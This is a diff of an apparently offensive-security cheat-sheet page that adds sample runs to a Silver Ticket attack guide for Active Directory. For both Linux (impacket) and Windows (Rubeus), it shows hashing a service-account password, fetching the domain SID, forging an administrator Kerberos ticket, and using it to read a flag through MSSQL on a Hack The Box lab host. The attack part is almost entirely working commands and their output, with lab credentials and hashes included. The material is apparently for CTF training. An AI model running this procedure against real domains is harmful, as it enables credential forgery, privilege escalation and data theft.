@@ -338,30 +338,108 @@ body.dark-mode #dynamicFormContainer button:hover {
 
 <button data-tabset="set1" data-tabcontent="tab2" >Windows</button>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-get-service-principle-name-spn">1. Get service principle name (SPN)</h4>
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><h4 id="1-get-service-principle-name-spn-optional">1. Get service principle name (SPN) [optional]</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-GetUserSPNs &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39; -dc-ip &lt;DC&gt; -request -k
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> If NTLM auth is disabled
 </span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-GetUserSPNs &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39; -dc-host &lt;DC&gt; -request -k
 </span></span></span></code></pre></div><h4 id="2-generate-ntlm">2. Generate NTLM</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">iconv -f ASCII -t UTF-16LE &lt;(printf &#39;&lt;PASSWORD&gt;&#39;) | openssl dgst -md4
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> iconv -f ASCII -t UTF-16LE &lt;<span class="o">(</span><span class="nb">printf</span> <span class="s1">&#39;REGGIE1234ronnie&#39;</span><span class="o">)</span> <span class="p">|</span> openssl dgst -md4 
+</span></span><span class="line"><span class="cl"><span class="go">MD4(stdin)= 1443ec19da4dac4ffc953bca1b57b4cf
 </span></span></span></code></pre></div><h4 id="3-get-domain-sid">3. Get domain SID</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-getPac -targetUser administrator &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc.sequel.htb <span class="o">&amp;&amp;</span> impacket-getPac -targetUser administrator <span class="s1">&#39;sequel.htb/sql_svc:REGGIE1234ronnie&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">KERB_VALIDATION_INFO 
+</span></span></span><span class="line"><span class="cl"><span class="go">LogonTime:                      
+</span></span></span><span class="line"><span class="cl"><span class="go">    dwLowDateTime:                   4131845666 
+</span></span></span><span class="line"><span class="cl"><span class="go">    dwHighDateTime:                  31133135 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go"> 
+</span></span></span><span class="line"><span class="cl"><span class="go">Domain SID: S-1-5-21-4078382237-1492182817-2568127209
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go"> 0000   10 00 00 00 43 04 A9 EA  FD 5C DC 66 5C CE D0 B2   ....C....\.f\...
 </span></span></span></code></pre></div><h4 id="4-generate-silver-ticket">4. Generate Silver Ticket</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-ticketer -nthash &lt;HASH&gt; -domain-sid &lt;SID&gt; -domain &lt;DOMAIN&gt; -dc-ip &lt;DC&gt; -spn &lt;SPN&gt; administrator
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">impacket-ticketer -nthash &lt;HASH&gt; -domain-sid &lt;SID&gt; -domain &lt;DOMAIN&gt; -dc-ip &lt;DC&gt; -spn anything/&lt;DC&gt; administrator
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-ticketer -nthash 1443ec19da4dac4ffc953bca1b57b4cf -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -dc-ip dc.sequel.htb -spn anything/dc.sequel.htb administrator
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Creating basic skeleton ticket and PAC Infos
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Customizing ticket for sequel.htb/administrator
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]     PAC_LOGON_INFO
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]     PAC_CLIENT_INFO_TYPE
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]     EncTicketPart
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]     EncTGSRepPart
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Signing/Encrypting final ticket
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]     PAC_SERVER_CHECKSUM
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]     PAC_PRIVSVR_CHECKSUM
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]     EncTicketPart
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]     EncTGSRepPart
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving ticket in administrator.ccache
 </span></span></span></code></pre></div><h4 id="5-import-ticket">5. Import ticket</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=administrator.ccache
-</span></span></span></code></pre></div><h4 id="6-check">6. Check</h4>
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>administrator.ccache
+</span></span></code></pre></div><h4 id="6-check">6. Check</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">klist
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> klist
+</span></span><span class="line"><span class="cl"><span class="go">Ticket cache: FILE:administrator.ccache
+</span></span></span><span class="line"><span class="cl"><span class="go">Default principal: administrator@SEQUEL.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Valid starting     Expires            Service principal
+</span></span></span><span class="line"><span class="cl"><span class="go">09/25/24 07:55:27  09/23/34 07:55:27  anything/dc.sequel.htb@SEQUEL.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">        renew until 09/23/34 07:55:27
+</span></span></span></code></pre></div><h4 id="7-access-service">7. Access service</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> For example: mssql
+</span></span><span class="line"><span class="cl"><span class="go">impacket-mssqlclient -k &lt;DC&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-mssqlclient -k dc.sequel.htb                                                
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Encryption required, switching to TLS
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] INFO(DC\SQLMOCK): Line 1: Changed database context to &#39;master&#39;.
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+</span></span></span><span class="line"><span class="cl"><span class="go">[!] Press help for extra shell commands
+</span></span></span><span class="line"><span class="cl"><span class="go">SQL (sequel\Administrator  dbo@master)&gt; SELECT * FROM OPENROWSET(BULK N&#39;C:\users\administrator\desktop\root.txt&#39;, SINGLE_CLOB) AS Contents
+</span></span></span><span class="line"><span class="cl"><span class="go">BulkColumn                                
+</span></span></span><span class="line"><span class="cl"><span class="go">---------------------------------------   
+</span></span></span><span class="line"><span class="cl"><span class="go">b&#39;2186a912c7f240246fd2c2b04651f9b4\r\n&#39;
 </span></span></span></code></pre></div></div>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-get-service-principle-name-spn">1. Get service principle name (SPN)</h4>
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-get-service-principle-name-spn-optional">1. Get service principle name (SPN) [optional]</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe kerberoast /domain:&lt;DOMAIN&gt; /dc:&lt;DC&gt; /creduser:&lt;DOMAIN&gt;\&lt;USER&gt; /credpassword:&#39;&lt;PASSWORD&gt;&#39; /nowrap
 </span></span></span></code></pre></div><h4 id="2-generate-ntlm">2. Generate NTLM</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe hash /password:&#39;&lt;PASSWORD&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt; .\rubeus.exe hash /password:&#39;REGGIE1234ronnie&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   ______        _
+</span></span></span><span class="line"><span class="cl"><span class="go">  (_____ \      | |
+</span></span></span><span class="line"><span class="cl"><span class="go">   _____) )_   _| |__  _____ _   _  ___
+</span></span></span><span class="line"><span class="cl"><span class="go">  |  __  /| | | |  _ \| ___ | | | |/___)
+</span></span></span><span class="line"><span class="cl"><span class="go">  | |  \ \| |_| | |_) ) ____| |_| |___ |
+</span></span></span><span class="line"><span class="cl"><span class="go">  |_|   |_|____/|____/|_____)____/(___/
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  v2.2.0
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Calculate Password Hash(es)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Input password             : REGGIE1234ronnie
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]       rc4_hmac             : 1443EC19DA4DAC4FFC953BCA1B57B4CF
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!
 </span></span></span></code></pre></div><h4 id="3-get-domain-sid">3. Get domain SID</h4>
 <h4 id="3a-locally">3a. Locally</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">import-module activedirectory
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt; import-module activedirectory
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-ADDomain | fl DomainSID
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt; Get-ADDomain | fl DomainSID
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">DomainSID : S-1-5-21-4078382237-1492182817-2568127209
 </span></span></span></code></pre></div><h4 id="3b-remotely">3b. Remotely</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Install ldp.exe <span class="o">(</span>Windows 11<span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="go">Settings &gt; System &gt; Optional Features &gt; More Windows Features and add &#39;Active Directory Lightweight Directory Services&#39;
@@ -371,9 +449,69 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span><span class="line"><span class="cl"><span class="go">BaseDN: DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;
 </span></span></span><span class="line"><span class="cl"><span class="go">Filter: (objectclass=User)
 </span></span></span></code></pre></div><h4 id="4-generate-silver-ticket">4. Generate silver ticket</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe silver /domain:&lt;DOMAIN&gt; /dc:&lt;DC&gt; /sid:&lt;SID&gt; /rc4:&lt;HASH&gt; /user:administrator /service:&lt;SPN&gt; /nowrap /ptt
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe silver /domain:&lt;DOMAIN&gt; /dc:&lt;DC&gt; /sid:&lt;SID&gt; /rc4:&lt;HASH&gt; /user:administrator /service:anything/&lt;DC&gt; /nowrap /ptt
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt; .\rubeus.exe silver /domain:sequel.htb /dc:dc.sequel.htb /sid:S-1-5-21-4078382237-1492182817-2568127209 /rc4:1443EC19DA4DAC4FFC953BCA1B57B4CF /user:administrator /service:anything/dc.sequel.htb /nowrap /ptt
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   ______        _
+</span></span></span><span class="line"><span class="cl"><span class="go">  (_____ \      | |
+</span></span></span><span class="line"><span class="cl"><span class="go">   _____) )_   _| |__  _____ _   _  ___
+</span></span></span><span class="line"><span class="cl"><span class="go">  |  __  /| | | |  _ \| ___ | | | |/___)
+</span></span></span><span class="line"><span class="cl"><span class="go">  | |  \ \| |_| | |_) ) ____| |_| |___ |
+</span></span></span><span class="line"><span class="cl"><span class="go">  |_|   |_|____/|____/|_____)____/(___/
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  v2.2.0
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Build TGS
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Building PAC
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Domain         : SEQUEL.HTB (SEQUEL)
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] SID            : S-1-5-21-4078382237-1492182817-2568127209
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] UserId         : 500
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Groups         : 520,512,513,519,518
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] ServiceKey     : 1443EC19DA4DAC4FFC953BCA1B57B4CF
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] KDCKey         : 1443EC19DA4DAC4FFC953BCA1B57B4CF
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Service        : anything
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Target         : dc.sequel.htb
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Generating EncTicketPart
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Signing PAC
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Encrypting EncTicketPart
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Generating Ticket
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Generated KERB-CRED
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Forged a TGS for &#39;administrator&#39; to &#39;anything/dc.sequel.htb&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] AuthTime       : 9/24/2024 5:06:04 PM
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] StartTime      : 9/24/2024 5:06:04 PM
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] EndTime        : 9/25/2024 3:06:04 AM
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] RenewTill      : 10/1/2024 5:06:04 PM
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] base64(ticket.kirbi):
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIFUTCCBU ...[SNIP]... F1ZWwuaHRi
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[+] Ticket successfully imported!
 </span></span></span></code></pre></div><h4 id="5-check">5. Check</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">klist
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\sql_svc\Documents&gt; klist
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Current LogonId is 0:0x1293866
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Cached Tickets: (1)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span>0&gt;     Client: administrator @ SEQUEL.HTB
+</span></span><span class="line"><span class="cl"><span class="go">        Server: anything/dc.sequel.htb @ SEQUEL.HTB
+</span></span></span><span class="line"><span class="cl"><span class="go">        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+</span></span></span><span class="line"><span class="cl"><span class="go">        Ticket Flags 0x40a00000 -&gt; forwardable renewable pre_authent
+</span></span></span><span class="line"><span class="cl"><span class="go">        Start Time: 9/24/2024 17:06:04 (local)
+</span></span></span><span class="line"><span class="cl"><span class="go">        End Time:   9/25/2024 3:06:04 (local)
+</span></span></span><span class="line"><span class="cl"><span class="go">        Renew Time: 10/1/2024 17:06:04 (local)
+</span></span></span><span class="line"><span class="cl"><span class="go">        Session Key Type: RSADSI RC4-HMAC(NT)
+</span></span></span><span class="line"><span class="cl"><span class="go">        Cache Flags: 0
+</span></span></span><span class="line"><span class="cl"><span class="go">        Kdc Called:
 </span></span></span></code></pre></div></div></p>
 
 </div></div>
